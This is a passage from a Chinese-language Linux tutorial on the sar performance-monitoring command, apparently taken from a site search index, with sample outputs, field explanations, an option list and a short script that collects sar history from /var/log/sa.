ALL | XALL } ] [ -P { <cpu> [,...] | ALL } ] [ -m { <keyword> [,...] | ALL } ] [ -n { <keyword> [,...] | ALL } ] [ -j { ID | LABEL | PATH | UUID | ... } ] [ -f [ <filename> ] | -o [ <filename> ] | -[0-9]+ ] [ -i <interval> ] [ -s [ <hh:mm:ss> ] ] [ -e [ <hh:mm:ss> ] ] \u4e00\u4e9b\u5e38\u7528\u7684\u5177\u4f53\u89e3\u91ca 1.\u67e5\u770bCPU\u4f7f\u7528\u60c5\u51b5 sar 1 3 \u6216 sar -u 1 3 $ sar 1 3 Linux 3.10.0-1160.45.1.el7.x86_64 (VM-0-16-centos) 05/31/2022 _x86_64_ (4 CPU) 12:48:15 AM CPU %user %nice %system %iowait %steal %idle 12:48:16 AM all 0.00 0.00 0.25 0.00 0.00 99.75 12:48:17 AM all 0.00 0.00 0.00 0.00 0.00 100.00 12:48:18 AM all 0.00 0.00 0.25 0.25 0.00 99.50 Average: all 0.00 0.00 0.17 0.08 0.00 99.75 %user \u7528\u6237\u7a7a\u95f4\u7684CPU\u4f7f\u7528 %nice \u6539\u53d8\u8fc7\u4f18\u5148\u7ea7\u7684\u8fdb\u7a0b\u7684CPU\u4f7f\u7528\u7387 %system \u5185\u6838\u7a7a\u95f4\u7684CPU\u4f7f\u7528\u7387 %iowait CPU\u7b49\u5f85IO\u7684\u767e\u5206\u6bd4 %steal \u865a\u62df\u673a\u7684\u865a\u62df\u673aCPU\u4f7f\u7528\u7684CPU %idle \u7a7a\u95f2\u7684CPU 2.\u67e5\u770b\u5e73\u5747\u8d1f\u8f7d sar -q 1 3 $ sar -q 1 3 Linux 3.10.0-1160.45.1.el7.x86_64 (VM-0-16-centos) 05/31/2022 _x86_64_ (4 CPU) 12:52:45 AM runq-sz plist-sz ldavg-1 ldavg-5 ldavg-15 blocked 12:52:46 AM 0 233 0.00 0.01 0.05 0 12:52:47 AM 0 233 0.00 0.01 0.05 0 12:52:48 AM 0 233 0.00 0.01 0.05 0 Average: 0 233 0.00 0.01 0.05 0 runq-sz R\u72b6\u6001\u7684\u8fdb\u7a0b\u6216\u8005\u7ebf\u7a0b\u6570 plist-sz \u8fdb\u7a0b\u5217\u8868\u4e2d\u7684\u8fdb\u7a0b\uff08processes\uff09\u548c\u7ebf\u7a0b\u6570\uff08threads\uff09\u7684\u6570\u91cf ldavg-1 \u6700\u540e1\u5206\u949f\u7684CPU\u5e73\u5747\u8d1f\u8f7d\uff0c\u5373\u5c06\u591a\u6838CPU\u8fc7\u53bb\u4e00\u5206\u949f\u7684\u8d1f\u8f7d\u76f8\u52a0\u518d\u9664\u4ee5\u6838\u5fc3\u6570\u5f97\u51fa\u7684\u5e73\u5747\u503c\uff0c5\u5206\u949f\u548c15\u5206\u949f\u4ee5\u6b64\u7c7b\u63a8 ldavg-5 \u6700\u540e5\u5206\u949f\u7684CPU\u5e73\u5747\u8d1f\u8f7d ldavg-15 \u6700\u540e15\u5206\u949f\u7684CPU\u5e73\u5747\u8d1f\u8f7d blocked \u56e0IO\u4e0d\u53ef\u4e2d\u65ad\u7684\u8fdb\u7a0b\u6216\u8005\u7ebf\u7a0b\u6570 3.\u67e5\u770b\u5185\u5b58\u4f7f\u7528\u60c5\u51b5 sar -r 1 3 $ sar -r 1 3 Linux 3.10.0-1160.45.1.el7.x86_64 (VM-0-16-centos) 05/31/2022 _x86_64_ (4 CPU) 12:55:29 AM kbmemfree kbmemused %memused kbbuffers kbcached kbcommit %commit kbactive kbinact kbdirty 12:55:30 AM 4646840 3361792 41.98 296276 2403396 2122468 26.50 1791748 1167196 228 12:55:31 AM 4646840 3361792 41.98 296276 2403396 2122468 26.50 1791752 1167196 228 12:55:32 AM 4646840 3361792 41.98 296276 2403396 2122468 26.50 1791752 1167196 232 Average: 4646840 3361792 41.98 296276 2403396 2122468 26.50 1791751 1167196 229 kbmemfree \u7a7a\u95f2\u7684\u7269\u7406\u5185\u5b58\u5927\u5c0f kbmemused \u4f7f\u7528\u4e2d\u7684\u7269\u7406\u5185\u5b58\u5927\u5c0f %memused \u7269\u7406\u5185\u5b58\u4f7f\u7528\u7387 kbbuffers \u5185\u6838\u4e2d\u4f5c\u4e3a\u7f13\u51b2\u533a\u4f7f\u7528\u7684\u7269\u7406\u5185\u5b58\u5927\u5c0f\uff0ckbbuffers\u548ckbcached:\u8fd9\u4e24\u4e2a\u503c\u5c31\u662ffree\u547d\u4ee4\u4e2d\u7684buffer\u548ccache. kbcached \u7f13\u5b58\u7684\u6587\u4ef6\u5927\u5c0f kbcommit \u5f53\u524d\u5de5\u4f5c\u8d1f\u8f7d\u6240\u9700\u7684\u5185\u5b58\u91cf\uff08KB\uff09\u3002\u8fd9\u662f\u4e00\u4e2a\u4f30\u8ba1\u9700\u8981\u591a\u5c11RAM\u548cswap\u6765\u4fdd\u8bc1\u6c38\u8fdc\u4e0d\u4f1a\u51fa\u73b0\u5185\u5b58\u4e0d\u8db3\u7684\u60c5\u51b5 commit \u5f53\u524d\u5de5\u4f5c\u8d1f\u8f7d\u6240\u9700\u5185\u5b58\u5360\u5185\u5b58\u603b\u91cf\uff08RAM+\u4ea4\u6362\uff09\u7684\u767e\u5206\u6bd4\u3002\u8fd9\u4e2a\u6570\u5b57\u53ef\u80fd\u5927\u4e8e100%\u3002 \u5c31\u662fkbcommit\u9664\u4ee5(\u5f53\u524d\u7684\u7269\u7406\u5185\u5b58+swap\u603b\u91cf) \u4f4e\u4e8e100%\u8bf4\u660e\u5185\u5b58\u65e0\u538b\u529b\uff0c\u9ad8\u4e8e100%\uff0c\u8bf4\u660e\u5185\u5b58\u4e0d\u591f\uff0c\u9700\u8981\u5347\u914d\u7f6e kbactive\uff0c\u8868\u793a\u6d3b\u8dc3\u5185\u5b58\uff0c\u4e5f\u5c31\u662f\u6700\u8fd1\u4f7f\u7528\u8fc7\u7684\u5185\u5b58\uff0c\u4e00\u822c\u4e0d\u4f1a\u88ab\u7cfb\u7edf\u56de\u6536\u3002 kbinact\uff0c\u8868\u793a\u975e\u6d3b\u8dc3\u5185\u5b58\uff0c\u4e5f\u5c31\u662f\u4e0d\u5e38\u8bbf\u95ee\u7684\u5185\u5b58\uff0c\u6709\u53ef\u80fd\u4f1a\u88ab\u7cfb\u7edf\u56de\u6536\u3002 4.\u67e5\u770b\u7cfb\u7edfswap\u5206\u533a\u7edf\u8ba1\u60c5\u51b5 sar -W 1 3 [root@VM-0-16-centos ~]# sar -W 1 3 Linux 3.10.0-1160.45.1.el7.x86_64 (VM-0-16-centos) 05/31/2022 _x86_64_ (4 CPU) 12:59:47 AM pswpin/s pswpout/s 12:59:48 AM 0.00 0.00 12:59:49 AM 0.00 0.00 12:59:50 AM 0.00 0.00 Average: 0.00 0.00 pswpin/s \u6bcf\u79d2\u4ece\u4ea4\u6362\u5206\u533a\u5230\u7cfb\u7edf\u7684\u4ea4\u6362\u9875\u9762\uff08swap page\uff09\u6570\u91cf pswpott/s \u6bcf\u79d2\u4ece\u7cfb\u7edf\u4ea4\u6362\u5230swap\u7684\u4ea4\u6362\u9875\u9762\uff08swap page\uff09\u7684\u6570\u91cf sar -B $ sar -B 1 3 Linux 3.10.0-1160.45.1.el7.x86_64 (VM-0-16-centos) 05/31/2022 _x86_64_ (4 CPU) 01:00:44 AM pgpgin/s pgpgout/s fault/s majflt/s pgfree/s pgscank/s pgscand/s pgsteal/s %vmeff 01:00:45 AM 0.00 0.00 29.00 0.00 72.00 0.00 0.00 0.00 0.00 01:00:46 AM 0.00 0.00 28.00 0.00 28.00 0.00 0.00 0.00 0.00 01:00:47 AM 0.00 0.00 18.00 0.00 25.00 0.00 0.00 0.00 0.00 Average: 0.00 0.00 25.00 0.00 41.67 0.00 0.00 0.00 0.00 pgpgin/s \uff1a\u7cfb\u7edf\u6bcf\u79d2\u4ece\u78c1\u76d8\u8c03\u5165\u7684\u603bKB\u6570\u3002 pgpgout/s \uff1a\u7cfb\u7edf\u6bcf\u79d2\u5206\u9875\u5230\u78c1\u76d8\u7684\u603bKB\u6570\u3002 fault/s\uff1a\u7cfb\u7edf\u6bcf\u79d2\u4ea7\u751f\u7684\u9875\u9762\u5931\u6548(major + minor)\u6570\u91cf majflt/s\uff1a\u7cfb\u7edf\u6bcf\u79d2\u4ea7\u751f\u7684\u9875\u9762\u5931\u6548(major)\u6570\u91cf pgscank/s\uff1a\u6bcf\u79d2\u88abkswapd\u626b\u63cf\u7684\u9875\u4e2a\u6570 pgscand/s\uff1a\u6bcf\u79d2\u76f4\u63a5\u88ab\u626b\u63cf\u7684\u9875\u4e2a\u6570 %vmeff\uff1a\u6bcf\u79d2\u6e05\u9664\u7684\u9875(pgsteal)\u5360\u603b\u626b\u63cf\u9875(pgscank + pgscand)\u7684\u767e\u5206\u6bd4 5.\u67e5\u770bIO\u548c\u4f20\u9012\u901f\u7387 sar -b 1 3 $ sar -b 1 3 Linux 3.10.0-1160.45.1.el7.x86_64 (VM-0-16-centos) 05/31/2022 _x86_64_ (4 CPU) 01:17:46 AM tps rtps wtps bread/s bwrtn/s 01:17:47 AM 0.00 0.00 0.00 0.00 0.00 01:17:48 AM 2.00 0.00 2.00 0.00 24.00 01:17:49 AM 0.00 0.00 0.00 0.00 0.00 Average: 0.67 0.00 0.67 0.00 8.00 tps \u78c1\u76d8\u6bcf\u79d2\u949f\u7684IO\u603b\u6570\uff0c\u7b49\u4e8eiostat\u4e2d\u7684tps rtps \u6bcf\u79d2\u949f\u4ece\u78c1\u76d8\u8bfb\u53d6\u7684IO\u603b\u6570 wtps \u6bcf\u79d2\u949f\u4ece\u5199\u5165\u5230\u78c1\u76d8\u7684IO\u603b\u6570 bread/s \u6bcf\u79d2\u949f\u4ece\u78c1\u76d8\u8bfb\u53d6\u7684\u5757\u603b\u6570 bwrtn/s \u6bcf\u79d2\u949f\u6b64\u5199\u5165\u5230\u78c1\u76d8\u7684\u5757\u603b\u6570 6.\u67e5\u770b\u78c1\u76d8\u4f7f\u7528\u60c5\u51b5 sar -d $ sar -d -p 1 1 Linux 3.10.0-1160.45.1.el7.x86_64 (VM-0-16-centos) 05/31/2022 _x86_64_ (4 CPU) 01:20:54 AM DEV tps rd_sec/s wr_sec/s avgrq-sz avgqu-sz await svctm %util 01:20:55 AM vda 2.00 0.00 24.00 12.00 0.00 1.00 1.50 0.30 01:20:55 AM vdb 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 01:20:55 AM sr0 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 Average: DEV tps rd_sec/s wr_sec/s avgrq-sz avgqu-sz await svctm %util Average: vda 2.00 0.00 24.00 12.00 0.00 1.00 1.50 0.30 Average: vdb 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 Average: sr0 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 DEV \u78c1\u76d8\u8bbe\u5907\u7684\u540d\u79f0\uff0c\u5982\u679c\u4e0d\u52a0-p\uff0c\u4f1a\u663e\u793adev253-0\u7c7b\u4f3c\u7684\u8bbe\u5907\u540d\u79f0\uff0c\u56e0\u6b64\u52a0\u4e0a-p\u663e\u793a\u7684\u540d\u79f0\u66f4\u76f4\u63a5 tps \u6bcf\u79d2I/O\u7684\u4f20\u8f93\u603b\u6570 rd_sec/s \u6bcf\u79d2\u8bfb\u53d6\u7684\u6247\u533a\u7684\u603b\u6570 wr_sec/s \u6bcf\u79d2\u5199\u5165\u7684\u6247\u533a\u7684\u603b\u6570 avgrq-sz \u5e73\u5747\u6bcf\u6b21\u6b21\u78c1\u76d8I/O\u64cd\u4f5c\u7684\u6570\u636e\u5927\u5c0f\uff08\u6247\u533a\uff09 avgqu-sz \u78c1\u76d8\u8bf7\u6c42\u961f\u5217\u7684\u5e73\u5747\u957f\u5ea6 await \u4ece\u8bf7\u6c42\u78c1\u76d8\u64cd\u4f5c\u5230\u7cfb\u7edf\u5b8c\u6210\u5904\u7406\uff0c\u6bcf\u6b21\u8bf7\u6c42\u7684\u5e73\u5747\u6d88\u8017\u65f6\u95f4\uff0c\u5305\u62ec\u8bf7\u6c42\u961f\u5217\u7b49\u5f85\u65f6\u95f4\uff0c\u5355\u4f4d\u662f\u6beb\u79d2\uff081\u79d2\u7b49\u4e8e1000\u6beb\u79d2\uff09\uff0c\u7b49\u4e8e\u5bfb\u9053\u65f6\u95f4+\u961f\u5217\u65f6\u95f4+\u670d\u52a1\u65f6\u95f4 svctm I/O\u7684\u670d\u52a1\u5904\u7406\u65f6\u95f4\uff0c\u5373\u4e0d\u5305\u62ec\u8bf7\u6c42\u961f\u5217\u4e2d\u7684\u65f6\u95f4 %util I/O\u8bf7\u6c42\u5360\u7528\u7684CPU\u767e\u5206\u6bd4\uff0c\u503c\u8d8a\u9ad8\uff0c\u8bf4\u660eI/O\u8d8a\u6162 7.\u7f51\u7edc\u63a5\u53e3\u4fe1\u606f sar -n DEV 1 1 $ sar -n DEV 1 1 Linux 3.10.0-1160.45.1.el7.x86_64 (VM-0-16-centos) 05/31/2022 _x86_64_ (4 CPU) 01:23:50 AM IFACE rxpck/s txpck/s rxkB/s txkB/s rxcmp/s txcmp/s rxmcst/s 01:23:51 AM veth664db5a 0.00 0.00 0.00 0.00 0.00 0.00 0.00 01:23:51 AM eth0 3.00 1.00 0.17 0.21 0.00 0.00 0.00 01:23:51 AM lo 0.00 0.00 0.00 0.00 0.00 0.00 0.00 01:23:51 AM br-be5dce24fae2 0.00 0.00 0.00 0.00 0.00 0.00 0.00 01:23:51 AM docker0 0.00 0.00 0.00 0.00 0.00 0.00 0.00 Average: IFACE rxpck/s txpck/s rxkB/s txkB/s rxcmp/s txcmp/s rxmcst/s Average: veth664db5a 0.00 0.00 0.00 0.00 0.00 0.00 0.00 Average: eth0 3.00 1.00 0.17 0.21 0.00 0.00 0.00 Average: lo 0.00 0.00 0.00 0.00 0.00 0.00 0.00 Average: br-be5dce24fae2 0.00 0.00 0.00 0.00 0.00 0.00 0.00 Average: docker0 0.00 0.00 0.00 0.00 0.00 0.00 0.00 IFACE \u672c\u5730\u7f51\u5361\u63a5\u53e3\u7684\u540d\u79f0 rxpck/s \u6bcf\u79d2\u949f\u63a5\u53d7\u7684\u6570\u636e\u5305 txpck/s \u6bcf\u79d2\u949f\u53d1\u9001\u7684\u6570\u636e\u5e93 rxKB/S \u6bcf\u79d2\u949f\u63a5\u53d7\u7684\u6570\u636e\u5305\u5927\u5c0f\uff0c\u5355\u4f4d\u4e3aKB txKB/S \u6bcf\u79d2\u949f\u53d1\u9001\u7684\u6570\u636e\u5305\u5927\u5c0f\uff0c\u5355\u4f4d\u4e3aKB rxcmp/s \u6bcf\u79d2\u949f\u63a5\u53d7\u7684\u538b\u7f29\u6570\u636e\u5305 txcmp/s \u6bcf\u79d2\u949f\u53d1\u9001\u7684\u538b\u7f29\u5305 rxmcst/s \u6bcf\u79d2\u949f\u63a5\u6536\u7684\u591a\u64ad\u6570\u636e\u5305 \u7f51\u7edc\u8bbe\u5907\u901a\u4fe1\u5931\u8d25\u4fe1\u606f sar -n EDEV 1 1 $ sar -n EDEV 1 1 Linux 3.10.0-1160.45.1.el7.x86_64 (VM-0-16-centos) 05/31/2022 _x86_64_ (4 CPU) 01:24:56 AM IFACE rxerr/s txerr/s coll/s rxdrop/s txdrop/s txcarr/s rxfram/s rxfifo/s txfifo/s 01:24:57 AM veth664db5a 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 01:24:57 AM eth0 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 01:24:57 AM lo 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 01:24:57 AM br-be5dce24fae2 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 01:24:57 AM docker0 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 Average: IFACE rxerr/s txerr/s coll/s rxdrop/s txdrop/s txcarr/s rxfram/s rxfifo/s txfifo/s Average: veth664db5a 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 Average: eth0 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 Average: lo 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 Average: br-be5dce24fae2 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 Average: docker0 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 IFACE \u7f51\u5361\u540d\u79f0 rxerr/s \u6bcf\u79d2\u949f\u63a5\u6536\u5230\u7684\u635f\u574f\u7684\u6570\u636e\u5305 txerr/s \u6bcf\u79d2\u949f\u53d1\u9001\u7684\u6570\u636e\u5305\u9519\u8bef\u6570 coll/s \u5f53\u53d1\u9001\u6570\u636e\u5305\u65f6\u5019\uff0c\u6bcf\u79d2\u949f\u53d1\u751f\u7684\u51b2\u649e\uff08collisions\uff09\u6570\uff0c\u8fd9\u4e2a\u662f\u5728\u534a\u53cc\u5de5\u6a21\u5f0f\u4e0b\u624d\u6709 rxdrop/s \u5f53\u7531\u4e8e\u7f13\u51b2\u533a\u6ee1\u7684\u65f6\u5019\uff0c\u7f51\u5361\u8bbe\u5907\u63a5\u6536\u7aef\u6bcf\u79d2\u949f\u4e22\u6389\u7684\u7f51\u7edc\u5305\u7684\u6570\u76ee txdrop/s \u5f53\u7531\u4e8e\u7f13\u51b2\u533a\u6ee1\u7684\u65f6\u5019\uff0c\u7f51\u7edc\u8bbe\u5907\u53d1\u9001\u7aef\u6bcf\u79d2\u949f\u4e22\u6389\u7684\u7f51\u7edc\u5305\u7684\u6570\u76ee txcarr/s \u5f53\u53d1\u9001\u6570\u636e\u5305\u7684\u65f6\u5019\uff0c\u6bcf\u79d2\u949f\u8f7d\u6ce2\u9519\u8bef\u53d1\u751f\u7684\u6b21\u6570 rxfram/s \u5728\u63a5\u6536\u6570\u636e\u5305\u7684\u65f6\u5019\uff0c\u6bcf\u79d2\u949f\u53d1\u751f\u7684\u5e27\u5bf9\u5176\u9519\u8bef\u7684\u6b21\u6570 rxfifo/s \u5728\u63a5\u6536\u6570\u636e\u5305\u7684\u65f6\u5019\uff0c\u6bcf\u79d2\u949f\u7f13\u51b2\u533a\u6ea2\u51fa\u7684\u9519\u8bef\u53d1\u751f\u7684\u6b21\u6570 txfifo/s \u5728\u53d1\u751f\u6570\u636e\u5305 \u7684\u65f6\u5019\uff0c\u6bcf\u79d2\u949f\u7f13\u51b2\u533a\u6ea2\u51fa\u7684\u9519\u8bef\u53d1\u751f\u7684\u6b21\u6570 \u7edf\u8ba1socket\u8fde\u63a5\u4fe1\u606f sar -n SOCK 1 1 $ sar -n SOCK Linux 3.10.0-1160.45.1.el7.x86_64 (VM-0-16-centos) 05/31/2022 _x86_64_ (4 CPU) 12:00:01 AM totsck tcpsck udpsck rawsck ip-frag tcp-tw 12:10:01 AM 266 6 3 0 0 0 12:20:01 AM 265 5 3 0 0 0 12:30:01 AM 265 5 3 0 0 0 12:40:01 AM 267 6 3 0 0 0 12:50:01 AM 268 7 3 0 0 0 01:00:01 AM 267 6 3 0 0 1 01:10:01 AM 267 6 3 0 0 0 01:20:01 AM 267 6 3 0 0 0 01:30:01 AM 267 6 3 0 0 0 Average: 267 6 3 0 0 0 totsck \u5f53\u524d\u88ab\u4f7f\u7528\u7684socket\u603b\u6570 tcpsck \u5f53\u524d\u6b63\u5728\u88ab\u4f7f\u7528\u7684TCP\u7684socket\u603b\u6570 udpsck \u5f53\u524d\u6b63\u5728\u88ab\u4f7f\u7528\u7684UDP\u7684socket\u603b\u6570 rawsck \u5f53\u524d\u6b63\u5728\u88ab\u4f7f\u7528\u4e8eRAW\u7684skcket\u603b\u6570 if-frag \u5f53\u524d\u7684IP\u5206\u7247\u7684\u6570\u76ee tcp-tw TCP\u5957\u63a5\u5b57\u4e2d\u5904\u4e8eTIME-WAIT\u72b6\u6001\u7684\u8fde\u63a5\u6570\u91cf 8.TCP\u8fde\u63a5\u7684\u7edf\u8ba1 sar -n TCP 1 1 $ sar -n TCP 1 1 Linux 3.10.0-1160.45.1.el7.x86_64 (VM-0-16-centos) 05/31/2022 _x86_64_ (4 CPU) 01:38:36 AM active/s passive/s iseg/s oseg/s 01:38:37 AM 0.00 0.00 2.00 1.00 Average: 0.00 0.00 2.00 1.00 active/s \u65b0\u7684\u4e3b\u52a8\u8fde\u63a5 passive/s \u65b0\u7684\u88ab\u52a8\u8fde\u63a5 iseg/s \u63a5\u53d7\u7684\u6bb5 oseg/s \u8f93\u51fa\u7684\u6bb5 \u5e38\u7528\u96c6\u5408 \u9ed8\u8ba4\u76d1\u63a7: sar 1 1 CPU\u548cIOWAIT\u7edf\u8ba1\u72b6\u6001 sar -b 1 1 IO\u4f20\u9001\u901f\u7387 sar -B 1 1 \u9875\u4ea4\u6362\u901f\u7387 sar -c 1 1 \u8fdb\u7a0b\u521b\u5efa\u7684\u901f\u7387 sar -d 1 1 \u5757\u8bbe\u5907\u7684\u6d3b\u8dc3\u4fe1\u606f sar -n DEV 1 1 \u7f51\u8def\u8bbe\u5907\u7684\u72b6\u6001\u4fe1\u606f sar -n EDVE 1 1 \u7f51\u7edc\u8bbe\u5907\u901a\u4fe1\u5931\u8d25\u4fe1\u606f sar -n SOCK 1 1 SOCK\u7684\u4f7f\u7528\u60c5\u51b5 sar -n TCP TCP\u8fde\u63a5\u7684\u7edf\u8ba1 sar -n ALL 1 1 \u6240\u6709\u7684\u7f51\u7edc\u72b6\u6001\u4fe1\u606f sar -P ALL 1 1 \u6bcf\u9897CPU\u7684\u4f7f\u7528\u72b6\u6001\u4fe1\u606f\u548cIOWAIT\u7edf\u8ba1\u72b6\u6001 sar -q 1 1 \u961f\u5217\u7684\u957f\u5ea6\uff08\u7b49\u5f85\u8fd0\u884c\u7684\u8fdb\u7a0b\u6570\uff09\u548c\u8d1f\u8f7d\u7684\u72b6\u6001 sar -r 1 1 \u5185\u5b58\u548cswap\u7a7a\u95f4\u4f7f\u7528\u60c5\u51b5 sar -R 1 1 \u5185\u5b58\u7684\u7edf\u8ba1\u4fe1\u606f\uff08\u5185\u5b58\u9875\u7684\u5206\u914d\u548c\u91ca\u653e\u3001\u7cfb\u7edf\u6bcf\u79d2\u4f5c\u4e3aBUFFER\u4f7f\u7528\u5185\u5b58\u9875\u3001\u6bcf\u79d2\u88abcache\u5230\u7684\u5185\u5b58\u9875\uff09 sar -u 1 1 CPU\u7684\u4f7f\u7528\u60c5\u51b5\u548cIOWAIT\u4fe1\u606f\uff08\u540c\u9ed8\u8ba4\u76d1\u63a7\uff09 sar -v 1 1 inode, file and other kernel tablesd\u7684\u72b6\u6001\u4fe1\u606f sar -w 1 1 \u6bcf\u79d2\u4e0a\u4e0b\u6587\u4ea4\u6362\u7684\u6570\u76ee sar -W 1 1 SWAP\u4ea4\u6362\u7684\u7edf\u8ba1\u4fe1\u606f(\u76d1\u63a7\u72b6\u6001\u540ciostat \u7684si so) sar -x 2906 1 1 \u663e\u793a\u6307\u5b9a\u8fdb\u7a0b(2906)\u7684\u7edf\u8ba1\u4fe1\u606f\uff0c\u4fe1\u606f\u5305\u62ec\uff1a\u8fdb\u7a0b\u9020\u6210\u7684\u9519\u8bef\u3001\u7528\u6237\u7ea7\u548c\u7cfb\u7edf\u7ea7\u7528\u6237CPU\u7684\u5360\u7528\u60c5\u51b5\u3001\u8fd0\u884c\u5728\u54ea\u9897CPU\u4e0a sar -y 1 1 TTY\u8bbe\u5907\u7684\u6d3b\u52a8\u72b6\u6001 sar\u7684man\u624b\u518c\uff1a sar(1) - Linux manual page (man7.org) sar\u5b98\u7f51\uff08\u4e0a\u9762\u6709sar\u7684\u5177\u4f53\u89e3\u91ca\uff09\uff1a \u7cfb\u7edf\u7edf\u8ba1\u5c40 (pagesperso-orange.fr) \u4e00\u6bb5\u67e5\u8be2sar\u5386\u53f2\u8bb0\u5f55\u7684\u811a\u672c\uff1a \u67e5\u627e\u6700\u8fd1\u4e00\u5929\u7684sar\u5386\u53f2\u5728\u4fdd\u5b58 sar_history() { if [ ! -d '/var/log/sa' ];then echo \"sar\u6570\u636e\u76ee\u5f55\u672a\u627e\u5230\" fi sa_file=$(find /var/log/sa/* -ctime -1 -name \"sa*\" ! -name \"sar*\") for i in ${sa_file};do sar -p -A -f ${i} >> sar_history_data.txt done } sar_history &","title":"sar\u547d\u4ee4"},{"location":"system/linux/%E8%AE%A1%E7%AE%97/sar/#sar","text":"sar\u5de5\u5177\u5c06\u5bf9\u7cfb\u7edf\u5f53\u524d\u7684\u72b6\u6001\u8fdb\u884c\u53d6\u6837\uff0c\u7136\u540e\u901a\u8fc7\u8ba1\u7b97\u6570\u636e\u548c\u6bd4\u4f8b\u6765\u8868\u8fbe\u7cfb\u7edf\u7684\u5f53\u524d\u8fd0\u884c\u72b6\u6001\u3002\u5b83\u7684\u7279\u70b9\u662f\u53ef\u4ee5\u8fde\u7eed\u5bf9\u7cfb\u7edf\u53d6\u6837\uff0c\u83b7\u5f97\u5927\u91cf\u7684\u53d6\u6837\u6570\u636e\u3002\u53d6\u6837\u6570\u636e\u548c\u5206\u6790\u7684\u7ed3\u679c\u90fd\u53ef\u4ee5\u5b58\u5165\u6587\u4ef6\uff0c\u4f7f\u7528\u5b83\u65f6\u6d88\u8017\u7684\u7cfb\u7edf\u8d44\u6e90\u5f88\u5c0f\u3002 \u8bed\u6cd5\u683c\u5f0f \uff1asar [ \u9009\u9879 ] [ <\u65f6\u95f4\u95f4\u9694> [ <\u6b21\u6570> ] ] \u5e38\u7528\u53c2\u6570\uff1a \ufeff sar -h \u663e\u793a\uff1a -A\uff1a\u6240\u6709\u62a5\u544a\u7684\u603b\u548c -e\uff1a\u8bbe\u7f6e\u663e\u793a\u62a5\u544a\u7684\u7ed3\u675f\u65f6\u95f4 -f\uff1a\u4ece\u5236\u5b9a\u7684\u6587\u4ef6\u8bfb\u53d6\u62a5\u544a -i\uff1a\u8bbe\u7f6e\u72b6\u6001\u4fe1\u606f\u5237\u65b0\u7684\u95f4\u9694\u65f6\u95f4 -P\uff1a\u62a5\u544a\u6bcf\u4e2aCPU\u7684\u72b6\u6001 -x\uff1a\u663e\u793a\u7ed9\u5b9a\u8fdb\u7a0b\u7684\u88c5 [root@VM-0-16-centos ~]# sar -h \u7528\u6cd5: sar [ \u9009\u9879 ] [ <\u65f6\u95f4\u95f4\u9694> [ <\u6b21\u6570> ] ] \u4e3b\u9009\u9879\u548c\u62a5\u544a\uff1a -b I/O \u548c\u4f20\u8f93\u901f\u7387\u4fe1\u606f\u72b6\u51b5 -B \u5206\u9875\u72b6\u51b5 -d \u5757\u8bbe\u5907\u72b6\u51b5 -F [ MOUNT ] Filesystems statistics -H \u4ea4\u6362\u7a7a\u95f4\u5229\u7528\u7387 -I { <\u4e2d\u65ad> | SUM | ALL | XALL } \u4e2d\u65ad\u4fe1\u606f\u72b6\u51b5 -m { <\u5173\u952e\u8bcd> [,...] | ALL } \u7535\u6e90\u7ba1\u7406\u7edf\u8ba1\u4fe1\u606f \u5173\u952e\u5b57: CPU CPU \u9891\u7387 FAN \u98ce\u6247\u901f\u5ea6 \\t\\tFREQ\\tCPU \u5e73\u5747\u65f6\u949f\u9891\u7387 IN \u8f93\u5165\u7535\u538b TEMP \u8bbe\u5907\u6e29\u5ea6 \\t\\tUSB\\t\u8fde\u63a5\u7684USB \u8bbe\u5907 -n { <\u5173\u952e\u8bcd> [,...] | ALL } \u7f51\u7edc\u7edf\u8ba1\u4fe1\u606f \u5173\u952e\u8bcd\u53ef\u4ee5\u662f\uff1a DEV \u7f51\u5361 EDEV \u7f51\u5361 (\u9519\u8bef) NFS NFS \u5ba2\u6237\u7aef NFSD NFS \u670d\u52a1\u5668 SOCK Sockets (\u5957\u63a5\u5b57) (v4) IP IP \u6d41 (v4) EIP IP \u6d41 (v4) (\u9519\u8bef) ICMP ICMP \u6d41 (v4) EICMP ICMP \u6d41 (v4) (\u9519\u8bef) TCP TCP \u6d41 (v4) ETCP TCP \u6d41 (v4) (\u9519\u8bef) UDP UDP \u6d41 (v4) SOCK6 Sockets (\u5957\u63a5\u5b57) (v6) IP6 IP \u6d41 (v6) EIP6 IP \u6d41 (v6) (\u9519\u8bef) ICMP6 ICMP \u6d41 (v6) EICMP6 ICMP \u6d41 (v6) (\u9519\u8bef) UDP6 UDP \u6d41 (v6) -q \u961f\u5217\u957f\u5ea6\u548c\u5e73\u5747\u8d1f\u8f7d -r \u5185\u5b58\u5229\u7528\u7387 -R \u5185\u5b58\u72b6\u51b5 -S \u4ea4\u6362\u7a7a\u95f4\u5229\u7528\u7387 -u [ ALL ] CPU \u5229\u7528\u7387 -v Kernel table \u72b6\u51b5 -w \u4efb\u52a1\u521b\u5efa\u4e0e\u7cfb\u7edf\u8f6c\u6362\u7edf\u8ba1\u4fe1\u606f -W \u4ea4\u6362\u4fe1\u606f -y TTY \u8bbe\u5907\u72b6\u51b5 $ sar --help \u7528\u6cd5: sar [ \u9009\u9879 ] [ <\u65f6\u95f4\u95f4\u9694> [ <\u6b21\u6570> ] ] Options are: [ -A ] [ -B ] [ -b ] [ -C ] [ -d ] [ -F [ MOUNT ] ] [ -H ] [ -h ] [ -p ] [ -q ] [ -R ] [ -r ] [ -S ] [ -t ] [ -u [ ALL ] ] [ -V ] [ -v ] [ -W ] [ -w ] [ -y ] [ -I { <int> [,...] | SUM | ALL | XALL } ] [ -P { <cpu> [,...] | ALL } ] [ -m { <keyword> [,...] | ALL } ] [ -n { <keyword> [,...] | ALL } ] [ -j { ID | LABEL | PATH | UUID | ... } ] [ -f [ <filename> ] | -o [ <filename> ] | -[0-9]+ ] [ -i <interval> ] [ -s [ <hh:mm:ss> ] ] [ -e [ <hh:mm:ss> ] 